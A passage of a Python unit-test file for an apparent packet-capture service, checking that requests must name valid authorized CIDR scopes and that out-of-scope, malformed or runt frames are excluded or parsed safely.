            except (TimeoutError, socket.timeout, OSError):
                continue

    def test_01_missing_scope_cidrs_rejected(self) -> None:
        """Omission of scope_cidrs is rejected with ProtocolError at validation level."""
        req = {"request_id": 1, "action": OP_CAPTURE_PACKETS, "interface": "eth0"}
        with self.assertRaises(ProtocolError) as ctx:
            validate_request_dict(req)
        self.assertIn("Missing mandatory 'scope_cidrs'", str(ctx.exception))

    def test_02_empty_scope_cidrs_rejected(self) -> None:
        """Empty scope_cidrs list is rejected with ProtocolError at validation level."""
        req = {"request_id": 1, "action": OP_CAPTURE_PACKETS, "interface": "eth0", "scope_cidrs": []}
        with self.assertRaises(ProtocolError) as ctx:
            validate_request_dict(req)
        self.assertIn("scope_cidrs cannot be empty", str(ctx.exception))

    def test_03_malformed_cidrs_rejected(self) -> None:
        """Malformed CIDR strings fail closed with ProtocolError."""
        for malformed in ["not-a-cidr", "192.168.1.300/24", "192.168.1.1/33"]:
            req = {"request_id": 1, "action": OP_CAPTURE_PACKETS, "interface": "eth0", "scope_cidrs": [malformed]}
            with self.assertRaises(ProtocolError):
                validate_request_dict(req)

    def test_04_invalid_or_unsupported_address_families(self) -> None:
        """Prefixlen 0 supernet is rejected by ScopeEnclosure boundary limits."""
        resp = self.client.capture_packets(
            interface="eth0",
            packet_count=5,
            scope_cidrs=["0.0.0.0/0"],
        )
        self.assertEqual(resp.status, CaptureStatus.SCOPE_VIOLATION)

    def test_05_valid_in_scope_ipv4_packets(self) -> None:
        """Valid IPv4 packets within authorized scope are admitted."""
        resp = self.client.capture_packets(
            interface="eth0",
            packet_count=5,
            scope_cidrs=["192.168.1.0/24"],
        )
        self.assertEqual(resp.status, CaptureStatus.SUCCESS)
        self.assertGreater(len(resp.payload.get("packets", [])), 0)

    def test_06_out_of_scope_ipv4_packets_excluded(self) -> None:
        """IPv4 packets targeting outside scope are excluded."""
        # Authorized scope is 10.10.10.0/24; synthetic trace packets are 192.168.1.105
        resp = self.client.capture_packets(
            interface="eth0",
            packet_count=5,
            timeout_seconds=0.2,
            scope_cidrs=["10.10.10.0/24"],
        )
        self.assertEqual(resp.status, CaptureStatus.SUCCESS)
        self.assertEqual(len(resp.payload.get("packets", [])), 0)

    def test_07_ipv6_packets_according_to_documented_policy(self) -> None:
        """IPv6 packets require an authorized IPv6 CIDR in scope enclosure."""
        # Scope with IPv6 subnet authorizes IPv6 address
        enclosure = ScopeEnclosure.from_strings(
            cidrs=["2001:db8::/32"],
            interfaces=["eth0"],
        )
        guard = ScopeGuard(enclosure)
        self.assertTrue(guard.is_authorized("2001:db8::1", interface="eth0"))

        # IPv4-only scope excludes IPv6 address
        enclosure_v4 = ScopeEnclosure.from_strings(
            cidrs=["192.168.1.0/24"],
            interfaces=["eth0"],
        )
        guard_v4 = ScopeGuard(enclosure_v4)
        self.assertFalse(guard_v4.is_authorized("2001:db8::1", interface="eth0"))

    def test_08_arp_and_non_ip_handling(self) -> None:
        """ARP protocol addresses (SPA/TPA) are verified against authorized scope."""
        enclosure = ScopeEnclosure.from_strings(
            cidrs=["192.168.1.0/24"],
            interfaces=["eth0"],
        )
        guard = ScopeGuard(enclosure)

        # In-scope ARP address
        self.assertTrue(guard.is_authorized("192.168.1.1", interface="eth0"))
        # Out-of-scope ARP address
        self.assertFalse(guard.is_authorized("10.0.0.1", interface="eth0"))

    def test_09_malformed_frames_and_missing_addresses(self) -> None:
        """Frames without proven IP/ARP addresses fail closed and are dropped."""
        guard = ScopeGuard(ScopeEnclosure.from_strings(cidrs=["192.168.1.0/24"], interfaces=["eth0"]))
        # Missing addresses cannot be authorized
        self.assertFalse(guard.is_authorized("", interface="eth0"))

    def test_10_proof_rejected_scope_does_not_create_worker_or_socket(self) -> None:
        """Requests with missing scope are rejected before any session worker is spawned."""
        with self.assertRaises(ProtocolError):
            validate_request_dict({
                "request_id": 1,
                "action": OP_CAPTURE_PACKETS,
                "interface": "eth0",
                "scope_cidrs": [],
            })

        resp = self.client.capture_packets(interface="eth0", scope_cidrs=[])
        self.assertEqual(resp.status, CaptureStatus.INVALID_REQUEST)
        self.assertEqual(resp.error_code, ErrorCode.INVALID_SCHEMA)
        self.assertEqual(len(self.server.session_registry._sessions), 0)


class TestPacketDissector(unittest.TestCase):
    """Test standard-library binary packet dissection logic."""

    def test_dissect_synthetic_arp_packet(self) -> None:
        """ARP packet bytes are parsed with correct layer fields and protocol."""
        dst_mac = b"\x00\x11\x22\x33\x44\x55"
        src_mac = b"\xaa\xbb\xcc\xdd\xee\xff"
        ethertype = struct.pack("!H", 0x0806)
        arp_payload = struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2)  # Ethernet, IPv4, Reply
        sender_mac = src_mac
        sender_ip = socket.inet_aton("192.168.1.1")
        target_mac = dst_mac
        target_ip = socket.inet_aton("192.168.1.105")
        raw_arp = dst_mac + src_mac + ethertype + arp_payload + sender_mac + sender_ip + target_mac + target_ip

        pkt, src_ip, dst_ip = PacketDissector.dissect_frame(raw_arp, index=1)
        self.assertEqual(pkt.protocol, "ARP")
        self.assertEqual(src_ip, "192.168.1.1")
        self.assertEqual(dst_ip, "192.168.1.105")
        self.assertGreaterEqual(len(pkt.layers), 2)

    def test_dissect_runt_frame(self) -> None:
        """Frame shorter than 14 bytes is parsed safely as Runt Frame without crash."""
        short_bytes = b"\x01\x02\x03"
        pkt, src_ip, dst_ip = PacketDissector.dissect_frame(short_bytes, index=9)
        self.assertEqual(pkt.protocol, "Runt Frame")
        self.assertIsNone(src_ip)
        self.assertIsNone(dst_ip)


if __name__ == "__main__":
    unittest.main()
